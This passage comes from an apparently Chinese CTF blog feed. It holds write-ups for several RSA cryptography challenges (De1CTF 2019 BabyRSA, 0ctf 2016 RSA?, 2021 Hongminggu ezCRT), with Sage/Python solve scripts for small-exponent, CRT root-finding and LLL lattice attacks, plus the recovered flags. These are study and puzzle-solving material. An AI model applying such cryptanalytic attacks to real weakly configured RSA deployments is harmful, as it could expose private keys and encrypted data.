<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 =  <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 =  <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp =  <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n  =  <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e1,ee1,n)==ce1)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e2+tmp,ee2,n)==ce2)</span><br></pre></td></tr></table></figure>

<p>e2加了一个padding，然后e=3可以用小指数解法，解出来减去tmp，得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e2 = <span class="number">381791429275130</span></span><br></pre></td></tr></table></figure>

<p>e1，和e2来个共模吧，我这里创造$e_1^{42}\ mod\ n$，相当于将ce1再做14次方模n，不知道可不可以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">184248803833368144507527482158254753456102436059792328559167056890008204564668583544316791778931084172047297608264133909324009314707553896235635211639233133607363861712312892361118629527362064961787009695248597106804395627805255359474989451093529378647565056831703141799794943273776382312947143190802046158174097138203112776712258154475273727098422965989978011736787396669332311941508114626948324330803438970382219225484642872929809644529306909820478119024559071046283253694826736959026215034831382526368076042757610908885320508141057588387594673572835966476324777431647490645334325605016262755417205130618921341925</span></span><br></pre></td></tr></table></figure>

<p>e1有这么大？接下来求flag那一层的n了</p>
<p>看第一个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c = [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line">f = <span class="keyword">lambda</span> m, e, n, c:<span class="built_in">pow</span>(m, e, n) == c</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">sum</span>(<span class="built_in">map</span>(f, [p]*<span class="number">4</span>, [<span class="number">4</span>]*<span class="number">4</span>, n, c)) == <span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>e=4，各种方法试过了，不太行。麻了呀，瞟了一眼WP，这不是四个同余式吗？直接crt一梭子，最后别忘了开个方</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">109935857933867829728985398563235455481120300859311421762540858762721955038310117609456763338082237907005937380873151279351831600225270995344096532750271070807051984097524900957809427861441436796934012393707770012556604479065826879107677002380580866325868240270494148512743861326447181476633546419262340100453</span></span><br></pre></td></tr></table></figure>

<p>然后还有一个hint没求出来，对于那个n，factordb好分。求出来hint，哦，似曾相识的场景</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!</span><br></pre></td></tr></table></figure>

<p>但是没事，我们得到了q1p和q1q；接下来有两条思路，一是通过e1这条，因为求得e1很大，但是感觉e1求出来有问题，而且也不满足Wiener和boneh_durfee的两个条件，所以暂时没有思路；二是通过e2这条路，因为e2分解得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 * 5 * 7 * 89 * 643 * 1063 * 89659</span><br></pre></td></tr></table></figure>

<p>可以采取上述有限域开方的算法。经检验，将e2去掉70这个因子时，可以求出d，那么接下里只要求<br>$$<br>c=m^{70}\ mod\ n<br>$$<br>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">p = <span class="number">109935857933867829728985398563235455481120300859311421762540858762721955038310117609456763338082237907005937380873151279351831600225270995344096532750271070807051984097524900957809427861441436796934012393707770012556604479065826879107677002380580866325868240270494148512743861326447181476633546419262340100453</span></span><br><span class="line">q = <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">8402626954844267019257189770827713712301490385606317353247232080660987949790497828588344121360142819597920380810717864248013962140671332736621869364023836966456292451288222487046361422315265333166292074987991328815414597857592078828853150603264183026137947540857054168476824895430715316542444821408894519825575271615168669882328867741339887771856046583079650726850387166574542239755300888839688437954412884568638812994672874904316709465173012849600200303575595413035671196508007653924536244993486097327630306519310746591152593249484415622597310848136958926253928859462221721082363622430393640647507855276596098618932</span></span><br><span class="line">e= <span class="number">14</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line">m=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m.append(CRT(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q))</span><br><span class="line">e = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> C <span class="keyword">in</span> m:</span><br><span class="line">    R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">    f = x ^ e - C</span><br><span class="line">    f = f.monic()</span><br><span class="line">    res1 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">    f = x ^e - C</span><br><span class="line">    f = f.monic()</span><br><span class="line">    res2 = f.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">            M=CRT(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">            flag = long_to_bytes(M)</span><br><span class="line">            <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;de1ctf&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(long_to_bytes(M))</span><br></pre></td></tr></table></figure>

<p>跑了有一会出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">de1ctf&#123;9b10a98b-71bb-4bdf-a6ff-f319943de21f&#125;</span><br></pre></td></tr></table></figure>

<p>最后我检查了下别的师傅的WP，发现e1这么做确实有问题，la佬也说了共模攻击，e之间要互素的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210709095550289.png" alt="De1CTF2019-BabyRSA共模攻击"></p>
<p>正确的做法，我没想到竟然可以iroot，运用小指数的攻击，很快就可以出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">15218928658178</span></span><br></pre></td></tr></table></figure>

<p>这不禁让我回忆了一下小指数rsa的攻击原理：<strong>还是爆破k ，所以e比较小还是都可以去试试的</strong></p>
<h3 id="0ctf-2016-RSA"><a href="#0ctf-2016-RSA" class="headerlink" title="0ctf 2016 - RSA?"></a>0ctf 2016 - RSA?</h3><blockquote>
<p>题目描述</p>
</blockquote>
<p>又是文件题型的rsa，让我祭出刚整理的OpenSSL</p>
<p>得到的数字如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0x2CAA9C09DC1061E507E5B7F39DDE3455FCFE127A2C69B621C83FD9D3D3EAA3AAC42147CD7188C53</span></span><br><span class="line">e = <span class="number">3</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>n这么短，e=3，狂喜；n用factordb分解得到三个素数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">26440615366395242196516853423447</span></span><br><span class="line">q = <span class="number">27038194053540661979045656526063</span></span><br><span class="line">r = <span class="number">32581479300404876772405716877547</span></span><br></pre></td></tr></table></figure>

<p>然后由于上面有提示，是这一类型的题目，所以直接用有有限域开方了，稍微改了下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">2485360255306619684345131431867350432205477625621366642887752720125176463993839766742234027524</span></span><br><span class="line">n = <span class="number">0x2CAA9C09DC1061E507E5B7F39DDE3455FCFE127A2C69B621C83FD9D3D3EAA3AAC42147CD7188C53</span></span><br><span class="line">p = <span class="number">26440615366395242196516853423447</span></span><br><span class="line">q = <span class="number">27038194053540661979045656526063</span></span><br><span class="line">r = <span class="number">32581479300404876772405716877547</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(r)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res3 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> res3:</span><br><span class="line">            <span class="comment"># 普普通通中国剩余定理</span></span><br><span class="line">            m = crt([<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),<span class="built_in">int</span>(k[<span class="number">0</span>])],[p,q,r])</span><br><span class="line">            flag = long_to_bytes(m)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0ctf&#123;HahA!Thi5_1s_n0T_rSa~&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CopperSmith</tag>
        <tag>(e, phi) != 1</tag>
        <tag>有限域开方</tag>
        <tag>Related Message Attack</tag>
      </tags>
  </entry>
  <entry>
    <title>【2021红明谷 ezCRT】看格</title>
    <url>/posts/377b2f28/</url>
    <content><![CDATA[<p>&nbsp;<span id="more"></span></p>
<h1 id="2021红明谷-ezCRT"><a href="#2021红明谷-ezCRT" class="headerlink" title="[2021红明谷] ezCRT"></a>[2021红明谷] ezCRT</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;flag is here&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuffle_flag</span>(<span class="params">s</span>):</span></span><br><span class="line">    str_list = <span class="built_in">list</span>(s)</span><br><span class="line">    shuffle(str_list)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(str_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nl = []</span><br><span class="line">el = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count != <span class="number">5</span>:</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.next_prime(bytes_to_long(flag))</span><br><span class="line">    e = gmpy2.invert(d, phi)</span><br><span class="line">    nl.append(n)</span><br><span class="line">    el.append(<span class="built_in">int</span>(e))</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(nl)</span><br><span class="line"><span class="built_in">print</span>(el)</span><br><span class="line"></span><br><span class="line">cl = []</span><br><span class="line">flag = shuffle_flag(flag.decode()).encode()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nl)):</span><br><span class="line">    cl.append(<span class="built_in">pow</span>(bytes_to_long(flag), el[i], nl[i]))</span><br><span class="line"><span class="built_in">print</span>(cl)</span><br></pre></td></tr></table></figure>

<h2 id="剽来的解题思路"><a href="#剽来的解题思路" class="headerlink" title="剽来的解题思路"></a>剽来的解题思路</h2><p>从官方剽来的解题思路，果然要用到格<br>可以看出题目是共私钥的，五组$n,e,c$且私钥较小，那么翻译成数学表达式则为：</p>
<p>$\phi(n_i)=n_i-(p+q)+1$，令$-(p+q)+1=s_i$<br>$$<br>\begin{cases}<br>e_1d-k_1n_1=k_1s_1+1\\<br>e_2d-k_2n_2=k_2s_2+1\\<br>e_3d-k_3n_3=k_3s_3+1\\<br>e_4d-k_4n_4=k_4s_4+1\\<br>e_5d-k_5n_5=k_5s_5+1<br>\end{cases}<br>$$<br>就可以写成$A=(d,k_1,k_2,k_3,k_4,k_5)$</p>
<p>$B=\begin{pmatrix} M &amp; e_1 &amp; e_2 &amp;e_3&amp;e_4&amp;e_5\\0 &amp; -n_1 &amp; 0&amp;0&amp;0&amp;0\\0 &amp; 0 &amp;-n_2&amp;0&amp;0&amp;0\\0&amp;0&amp;0&amp;-n_3&amp;0&amp;0\\0&amp;0&amp;0&amp;0&amp;-n_4&amp;0\\0&amp;0&amp;0&amp;0&amp;0&amp;-n_5\end{pmatrix}$</p>
<p>$C=(dM,e_1d-k_1n_1,e_2d-k_2n_2,e_3d-k_3n_3,e_4d-k_4n_4,e_5d-k_5n_5)$</p>
<p>$AB=C$,其中$M=\sqrt n_1$,是为了调整范数，具体原因见lattice相关文章。对矩阵$B$.LLL()格约得到$C$，第一位除以$M$就是私钥$d$了；解出flag<br>求d脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, sqrt</span><br><span class="line">nl = [<span class="number">92568419674731290088321621356482160506897805615722568594108449347104924357404183476911642777855820991398881156764068184840768873749718093598712551142529474514837161712525386555067489900887826033760157015587905876891826276883359425048106383489316555600680137377034136599761900203863336332834524981581608546277</span>, <span class="number">156396473818563541024482014372866929605198443382524196879362284224099117401220679011156723462510565131555949471059964179767945960498473012008220045105490122503438703770112687917922899337041421537937431868908340506324082719417747902320117904166584374628828367801012533926776313544525573302674702867896838756349</span>, <span class="number">158394833243620345170313957479796081390446308753163267294427471181012679879060921676287361174926310080500003540773261012005682050743188110335872216992843352902160171999286576526304619756655278142788064189969927027027650043645613441449926633380809295720977302961310978360575684689811662689798196832145977450067</span>, <span class="number">160088237013152996062303719345275590040820298863729670660621544625451638541931139026114480452748397901155923890465415946150076272684251867169893163248736673419035618274961179288085209456220719404244194802327491684233804878013160262798831738441790443743813368173495029170393018727204042599457829167334217403039</span>, <span class="number">176125361422384852665447804150030174008849487020728296169340093618559367127086381778331613043595010796295772394708222184703701230685609172767761426620379001062695169120599393984950488304290958534830276649464003949555105491117656796777657620812669612752464591728873199832200616338112460100967288829163217253937</span>]</span><br><span class="line">el = [<span class="number">69312028009355287369151190914681978515224902099126626288106202481561083869512381976466800912049172557479956400189281179789850182367192324370292880508005951892909864237831856642160554901550928757105750738313195248541515727624216048436593804176317465366380022764459799506858495981817822670957526705611211712923</span>, <span class="number">75652848678989239962391202584125835503829570694373189157636155436633908234362973839251550542975725789188895010096917574118924190081886365041870173203566890015476761857546914959928731140619341634983144909962106759048918025248827973161384045263311189477657141886093632791593341193393085433749877270828641736687</span>, <span class="number">33787880341418355427411601538315129862488529656310145182009801227014512555036822623215545927750632031483856865027938518144081751233475248361490189179988637342429805607352670543555743822390555949569061340741015073482051059972283793490798701339277926430357560613555427570475360496737455291914090967005368044847</span>, <span class="number">45894271603047945281790624112313938740541711331584775481261776728213544262108835859642003140814571796838418889270625806159755478669858113687476417240730385707171289922064965084283027730393146219788228689778873266618663473231744646293406030907691363263939114550226424730102211751706087680590823466426973879111</span>, <span class="number">39462780066564051085365889083337472288277223628014907704844994419242541623368920096395581667207909872944692627394665038729398405841875334128211337544205143876652949004817962123951132753801707134333132359039376283331685997619531570270269964807335633423631078057345827010794671894948828680193958561375351954627</span>]</span><br><span class="line">cl = [<span class="number">706565317398633346290694952311166623770389747503953970254889622211015097472765489676349936599997109100148837713409666075736711752497174928509516666210124850782396573268200919345005742905131769799719677758163730270857245509037860252700476102090438501579886321486095767737006847692632649652528793934802014895</span>, <span class="number">39976293505792731417500342473259466413746324373570160856607039564687056797068114044891309890160001547746290678089875953230720229396293686037539133378586045964793387433679304899158546834837314101138069400994334720071006048815998660691472991971598192116289517127819703723844842002711298154106615035755646791235</span>, <span class="number">82622936948791971063481195310587447614375265630407688161651173440160941964839173273115526802240672776681580169092371677673709037579318090622040018030730165371997331146171751228791524747622285256591779419274845659567001522182995468819720594650389854677582186770321424062935881407083956991646633760500152137305</span>, <span class="number">47924672523033740219454774309397006543851002473271747603676349322670782245519637286314088457132590816165876451615235937683074852920250584155682791595116359054889940842281324709426616771765312825842634237678243213350551342690870568516232078792788925700389762945955053433276153136302757700081859531596237286407</span>, <span class="number">157462720644970256050843434459828247139256140406409429896418317109064365936294939244159292550184482469972819258184119865598346921909220060266145241164734603316978286567811044606538176157224828857158099074286931716459626013079677895357212211176535500327064375073662684801175545519382470886239209020257096407424</span>]</span><br><span class="line">M = <span class="built_in">int</span>(sqrt(nl[<span class="number">0</span>]))</span><br><span class="line">A = matrix([[M, el[<span class="number">0</span>], el[<span class="number">1</span>], el[<span class="number">2</span>], el[<span class="number">3</span>], el[<span class="number">4</span>]],</span><br><span class="line">           [<span class="number">0</span>, -nl[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">           [<span class="number">0</span>, <span class="number">0</span>, -nl[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">           [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -nl[<span class="number">2</span>], <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">           [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -nl[<span class="number">3</span>], <span class="number">0</span>],</span><br><span class="line">           [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -nl[<span class="number">4</span>]]])</span><br><span class="line">C = A.LLL()</span><br><span class="line">d = C[<span class="number">0</span>] // M</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>

<p>算出来的d是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = <span class="number">4035685915436099980994650889948556572401301700215759631583373002944008951077734389446917516925581134450058777751810063</span></span><br></pre></td></tr></table></figure>

<p>之前的脚本没白写<br>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, next_prime</span><br><span class="line">flag = <span class="string">b&quot;flag is here&quot;</span></span><br><span class="line">d = <span class="number">4035685915436099980994650889948556572401301700215759631583373002944008951077734389446917516925581134450058777751810063</span></span><br><span class="line">nl = [<span class="number">92568419674731290088321621356482160506897805615722568594108449347104924357404183476911642777855820991398881156764068184840768873749718093598712551142529474514837161712525386555067489900887826033760157015587905876891826276883359425048106383489316555600680137377034136599761900203863336332834524981581608546277</span>, <span class="number">156396473818563541024482014372866929605198443382524196879362284224099117401220679011156723462510565131555949471059964179767945960498473012008220045105490122503438703770112687917922899337041421537937431868908340506324082719417747902320117904166584374628828367801012533926776313544525573302674702867896838756349</span>, <span class="number">158394833243620345170313957479796081390446308753163267294427471181012679879060921676287361174926310080500003540773261012005682050743188110335872216992843352902160171999286576526304619756655278142788064189969927027027650043645613441449926633380809295720977302961310978360575684689811662689798196832145977450067</span>, <span class="number">160088237013152996062303719345275590040820298863729670660621544625451638541931139026114480452748397901155923890465415946150076272684251867169893163248736673419035618274961179288085209456220719404244194802327491684233804878013160262798831738441790443743813368173495029170393018727204042599457829167334217403039</span>, <span class="number">176125361422384852665447804150030174008849487020728296169340093618559367127086381778331613043595010796295772394708222184703701230685609172767761426620379001062695169120599393984950488304290958534830276649464003949555105491117656796777657620812669612752464591728873199832200616338112460100967288829163217253937</span>]</span><br><span class="line">el = [<span class="number">69312028009355287369151190914681978515224902099126626288106202481561083869512381976466800912049172557479956400189281179789850182367192324370292880508005951892909864237831856642160554901550928757105750738313195248541515727624216048436593804176317465366380022764459799506858495981817822670957526705611211712923</span>, <span class="number">75652848678989239962391202584125835503829570694373189157636155436633908234362973839251550542975725789188895010096917574118924190081886365041870173203566890015476761857546914959928731140619341634983144909962106759048918025248827973161384045263311189477657141886093632791593341193393085433749877270828641736687</span>, <span class="number">33787880341418355427411601538315129862488529656310145182009801227014512555036822623215545927750632031483856865027938518144081751233475248361490189179988637342429805607352670543555743822390555949569061340741015073482051059972283793490798701339277926430357560613555427570475360496737455291914090967005368044847</span>, <span class="number">45894271603047945281790624112313938740541711331584775481261776728213544262108835859642003140814571796838418889270625806159755478669858113687476417240730385707171289922064965084283027730393146219788228689778873266618663473231744646293406030907691363263939114550226424730102211751706087680590823466426973879111</span>, <span class="number">39462780066564051085365889083337472288277223628014907704844994419242541623368920096395581667207909872944692627394665038729398405841875334128211337544205143876652949004817962123951132753801707134333132359039376283331685997619531570270269964807335633423631078057345827010794671894948828680193958561375351954627</span>]</span><br><span class="line">cl = [<span class="number">706565317398633346290694952311166623770389747503953970254889622211015097472765489676349936599997109100148837713409666075736711752497174928509516666210124850782396573268200919345005742905131769799719677758163730270857245509037860252700476102090438501579886321486095767737006847692632649652528793934802014895</span>, <span class="number">39976293505792731417500342473259466413746324373570160856607039564687056797068114044891309890160001547746290678089875953230720229396293686037539133378586045964793387433679304899158546834837314101138069400994334720071006048815998660691472991971598192116289517127819703723844842002711298154106615035755646791235</span>, <span class="number">82622936948791971063481195310587447614375265630407688161651173440160941964839173273115526802240672776681580169092371677673709037579318090622040018030730165371997331146171751228791524747622285256591779419274845659567001522182995468819720594650389854677582186770321424062935881407083956991646633760500152137305</span>, <span class="number">47924672523033740219454774309397006543851002473271747603676349322670782245519637286314088457132590816165876451615235937683074852920250584155682791595116359054889940842281324709426616771765312825842634237678243213350551342690870568516232078792788925700389762945955053433276153136302757700081859531596237286407</span>, <span class="number">157462720644970256050843434459828247139256140406409429896418317109064365936294939244159292550184482469972819258184119865598346921909220060266145241164734603316978286567811044606538176157224828857158099074286931716459626013079677895357212211176535500327064375073662684801175545519382470886239209020257096407424</span>]</span><br><span class="line">N = <span class="number">1</span></span><br><span class="line">M = <span class="number">0</span></span><br><span class="line">A = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">B = [<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">ml = [<span class="number">0</span> <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> nl:</span><br><span class="line">    N *= i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    A[i] = N // nl[i]</span><br><span class="line">    B[i] = invert(A[i], nl[i])</span><br><span class="line">    ml[i] = <span class="built_in">int</span>(<span class="built_in">pow</span>(cl[i], d, nl[i]))</span><br><span class="line">    M += ml[i]*A[i]*B[i]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(M % N))</span><br></pre></td></tr></table></figure>

<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>跑出来是这个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8b3i7a4af3fb3&#123;adcb-56a-6nd78a-gb89g-42p&#125;efd33l9d2</span><br></pre></td></tr></table></figure>

